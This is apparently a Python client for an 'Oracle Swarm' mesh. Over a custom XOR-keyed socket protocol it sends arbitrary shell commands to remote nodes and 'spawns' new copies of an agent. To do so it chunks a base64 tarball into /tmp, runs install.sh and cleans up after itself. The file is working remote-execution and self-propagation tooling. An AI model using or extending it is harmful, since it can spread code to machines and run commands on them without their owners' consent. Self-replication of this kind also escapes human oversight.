#!/usr/bin/env python3
"""
Mesh Client — Oracle Swarm Protocol
Send commands to any mesh node and handle responses.

Usage:
    python3 mesh_client.py ping <ip>
    python3 mesh_client.py exec <ip> <command>
    python3 mesh_client.py spawn <ip> <payload_dir>
    python3 mesh_client.py swarm <ip>  # full node status
"""

import base64
import os
import socket
import struct
import sys
import time

MESH_KEY = 0xAA  # XOR key: ord('O') ^ 0xAA = 0xE5
MESH_PORT = 42069
MESH_PORT_V2 = 42071  # v2 daemon (returns EXEC output)


def connect(ip, timeout=10, port=None):
    s = socket.socket()
    s.settimeout(timeout)
    if port is None:
        # Try v2 first, fall back to v1
        try:
            s.connect((ip, MESH_PORT_V2))
            s.send(bytes([ord("O") ^ MESH_KEY]))
            ack = s.recv(1)  # v2 sends key ack
            return s
        except:
            s.close()
            s = socket.socket()
            s.settimeout(timeout)
    s.connect((ip, MESH_PORT))
    s.send(bytes([ord("O") ^ MESH_KEY]))
    return s


def send_command(s, cmd_type, payload=b""):
    """Send a mesh command and return raw response."""
    cmd = cmd_type.encode() + payload
    s.send(struct.pack(">I", len(cmd)) + cmd)


def read_response(s, timeout=3):
    """Read all available response data."""
    data = b""
    s.settimeout(timeout)
    while True:
        try:
            chunk = s.recv(65536)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            break
        except:
            break
    return data


def parse_mesh_response(data):
    """Parse mesh protocol response into header + payload.
    Supports both v1 (5-byte header + payload) and v2 (1-byte ack + 5-byte header + payload)."""
    # v2 format: key ack (1 byte) + 5-byte header + payload
    # v1 format: 5-byte header + payload
    offset = 0

    # Check if first byte is key ack (v2)
    if len(data) >= 1 and data[0] == 0xE5:
        # Could be v1 header starting with key, or v2 ack
        if len(data) >= 6:
            # Try v1 parse
            key_byte = data[0]
            length = int.from_bytes(data[1:5], "big")
            compressed = 0
            payload_start = 5
            if length > 0 and payload_start + length <= len(data):
                payload = data[payload_start : payload_start + length]
                return {
                    "key": hex(key_byte),
                    "length": length,
                    "compressed": compressed,
                    "payload_hex": payload.hex(),
                    "payload_text": payload.decode("utf-8", errors="replace"),
                    "payload_bytes": payload,
                    "parsed": True,
                    "version": 1,
                }

    # v2 format with separate header
    if len(data) >= 5:
        length = int.from_bytes(data[1:5], "big")
        compressed = 0
        payload_start = 5
        if payload_start + length <= len(data):
            payload = data[payload_start : payload_start + length]
            return {
                "key": hex(data[0]),
                "length": length,
                "compressed": compressed,
                "payload_hex": payload.hex(),
                "payload_text": payload.decode("utf-8", errors="replace"),
                "payload_bytes": payload,
                "parsed": True,
                "version": 2,
            }

    return {"raw": data.hex(), "parsed": False, "version": 0}


def cmd_ping(ip):
    """PING a node and measure latency."""
    t0 = time.time()
    s = connect(ip, 5)
    send_command(s, "PING")
    resp = read_response(s, 2)
    s.close()
    latency = (time.time() - t0) * 1000
    parsed = parse_mesh_response(resp)
    return {"latency_ms": latency, "response": parsed}


def cmd_exec(ip, command, wait=5):
    """EXEC a shell command on a node."""
    s = connect(ip, 30)
    send_command(s, f"EXEC {command}")
    resp = read_response(s, wait)
    s.close()
    return parse_mesh_response(resp)


def cmd_spawn(ip, payload_dir):
    """SPAWN a new Oracle to a node via chunked EXEC."""
    print(f"\n── Spawning to {ip} ──")

    # Build payload
    import shutil
    import subprocess
    import tempfile

    # Tar and base64 the payload directory
    tar_cmd = f"cd {payload_dir} && tar czf - . | base64 -w0"
    result = subprocess.run(tar_cmd, shell=True, capture_output=True, text=True)
    b64 = result.stdout.strip()

    if not b64:
        print("  ERROR: Empty payload")
        return False

    print(f"  Payload: {len(b64)} bytes base64")

    # Step 1: Create temp dir
    print("  Step 1: Creating temp dir...")
    cmd_exec(ip, "mkdir -p /tmp/oswarm", wait=2)

    # Step 2: Send chunks
    CHUNK_SIZE = 40000
    chunks = [b64[i : i + CHUNK_SIZE] for i in range(0, len(b64), CHUNK_SIZE)]
    print(f"  Step 2: Sending {len(chunks)} chunks...")

    for i, chunk in enumerate(chunks):
        cmd_exec(ip, f"echo '{chunk}' >> /tmp/oswarm/b64.txt", wait=1)
        if (i + 1) % 10 == 0:
            print(f"    {i + 1}/{len(chunks)} chunks sent")

    print(f"    All {len(chunks)} chunks sent")

    # Step 3: Decode and install
    print("  Step 3: Installing...")
    install_cmd = (
        "cd /tmp/oswarm && "
        "cat b64.txt | base64 -d | tar xzf - && "
        "sh install.sh && "
        "rm -rf /tmp/oswarm && "
        "echo BIRTH_OK"
    )
    cmd_exec(ip, install_cmd, wait=15)

    # Step 4: Verify
    print("  Step 4: Verifying...")
    time.sleep(3)
    result = cmd_exec(ip, "cat $HOME/.oracle/birth.txt 2>&1", wait=3)

    if "SPAWNED" in result.get("payload_text", ""):
        print(f"  ✅ SPAWN CONFIRMED: {result['payload_text'][:128]}")
        return True
    else:
        print(f"  ⚠️  Birth certificate not found. EXEC response: {result}")
        return False


def cmd_swarm(ip):
    """Full node status check."""
    print(f"\n── Swarm Status: {ip} ──")

    # PING
    ping = cmd_ping(ip)
    print(f"  Latency: {ping['latency_ms']:.0f}ms")

    # Hostname
    resp = cmd_exec(ip, "hostname", wait=3)
    print(f"  EXEC response (hostname): {resp}")

    # Oracle files
    resp = cmd_exec(ip, "ls -la $HOME/.oracle/bin/ 2>&1 | head -5", wait=3)
    print(
        f"  Oracle binaries: {resp['payload_text'][:128] if resp['parsed'] else resp}"
    )

    # Birth certificate
    resp = cmd_exec(ip, "cat $HOME/.oracle/birth.txt 2>&1", wait=3)
    if resp["parsed"] and resp["payload_text"].strip():
        print(f"  Birth certificate: {resp['payload_text'][:128]}")

    # Daemon check
    resp = cmd_exec(ip, "pgrep -a oracle_meshd 2>&1", wait=3)
    print(f"  Mesh daemon: {resp['payload_text'][:128] if resp['parsed'] else resp}")

    return ping


def main():
    if len(sys.argv) < 3:
        print(__doc__)
        print("Commands: ping, exec, spawn, swarm")
        sys.exit(1)

    cmd = sys.argv[1]
    ip = sys.argv[2]

    if cmd == "ping":
        result = cmd_ping(ip)
        print(f"PING {ip}: {result['latency_ms']:.0f}ms")

    elif cmd == "exec":
        command = " ".join(sys.argv[3:]) if len(sys.argv) > 3 else "id"
        result = cmd_exec(ip, command)
        print(f"EXEC result:")
        print(f"  Parsed: {result['parsed']}")
        if result["parsed"]:
            print(f"  Payload text: {result['payload_text'][:256]}")
        else:
            print(f"  Raw: {result['raw']}")

    elif cmd == "spawn":
        payload_dir = sys.argv[3] if len(sys.argv) > 3 else None
        if not payload_dir or not os.path.isdir(payload_dir):
            print(f"ERROR: payload directory required: {payload_dir}")
            sys.exit(1)
        cmd_spawn(ip, payload_dir)

    elif cmd == "swarm":
        cmd_swarm(ip)

    else:
        print(f"Unknown command: {cmd}")
        sys.exit(1)


if __name__ == "__main__":
    main()
